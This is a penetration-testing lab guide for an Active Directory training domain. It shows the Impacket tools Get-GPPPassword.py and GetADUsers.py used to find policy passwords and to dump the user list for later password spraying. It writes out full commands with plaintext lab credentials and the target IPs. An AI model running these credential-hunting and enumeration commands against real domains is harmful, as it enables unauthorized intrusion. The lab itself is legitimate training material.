This lab provides an introduction to the use of the Impacket Python classes provided by SecureAuthCorp. This toolkit is among a pentester's favorites. Some of the tools reviewed in this lab are listed below  
* Get-GPPPassword  
* GetUserSPNs  
* Secretsdump.py  
* GetADUsers.py  
  
The domain passwords we discovered in user attributes will be useful for these labs. As recommended during an earlier lab, you will need to reference previously compromised accounts to use some of the tools in this lab. For example, SecretsDump, GetGPPPassword, GetUserSPNs rely on a domain user account for usage.
# Objectives
This lab provides an opportunity to interact with one of the most important toolkits used by security analysts, penetration testers, and hackers alike.
# Methods
* Active impacket's Python environment  
* Review tools in /examples/  
* Run Get-GPPPassword.py  
* Run Get-UserSPNs.py  
* Run (cheat) Secretsdump.py  
* Run Get-ADUsers.py

# System to Execute On
Operate this lab on Linux System Nux01

```
ssh doadmin@20.232.164.198
```
# Activate Python Dependency Environment

First we will prepare a Python Dependency environment to execute the Impacket tools within.

Run these commands to prepare the environment and list the tools of Impacket.

```bash
deactivate
sudo -s
cd /opt/impacket
cd examples
ls #AllTheTools
```

With setup file
```bash
sudo python3 ./setup.py install
```
# Attack: GetGPPasswords.py
Our first investigation is going to search the domain for group policy preference passwords. You might laugh here and say "yeah, that is not a thing any longer. You just won't find it." This showed up in a report written for a customer in the second half of December, 2021. The recovered password was used for domain escalation. It. Still. Happens.

Your target domain controller IP address is:Â `192.168.2.4`

Run the following command to see the Get-GPPPasswords.py quick help file.

```bash
Get-GPPPassword.py
```

Remember the earlier mentions of credential maintenance? You need to find the user accounts in your BadBlood deployment that were compromised, both username and password.

**This lab requires strict adherence to the use of single quotes: '**

Determine which user account you plan to use with these tools. Both Get-* tools only require minimal domain privilege. SecretsDump requires higher privileges for the account due to the nature of remote registry access and making requests for the contents of LSA.

To clarify - Get-GPPPassword reviews the contents of the domain's SYSVOL share, which under most circumstances is readable by the entire "Domain Users" group.

Lets excute Get-GPPPasswords with an account credential observed earlier.

```bash
Get-GPPPassword.py 'doazlab.com'/'ella_mejia':'Yzafqau7r3EQdrdw!#Eiunp'@'192.168.2.4'
```

Sadly, the results indicate that there were no group policy preference passwords available on this domain. That's ok, it was expected.

If you do not have credentials to use, feel free to use your doazlab\doadmin:DOLabAdmin1! account. That command is copied below if you need it.

```bash
Get-GPPPassword.py 'doazlab.com'/'doadmin':'DOLabAdmin1!'@'192.168.2.4'
```

# Attack: GetADUsers.py
This Python class was written to enumerate AD users as either individuals or en masse. We are going to use it here to dump a list of users out of the Active Directory environment and later as the user list for password spraying.

The following command is used to dump a list of to both the console and to create a file (tee) in the /opt/ directory called adusers.txt.
- TODO
```bash
sudo -s
cd /opt/impacket/
source imp-env/bin/activate
cd examples/
python3 GetADUsers.py -all -ts doazlab.com/doadmin:'DOLabAdmin1!' -dc-ip 192.168.2.4 |tee -a /opt/adusers.txt
```

Exit the virtual Impacket environment gracefully.

```bash
deactivate
cd /opt/
ls
wc -l adusers.txt
```
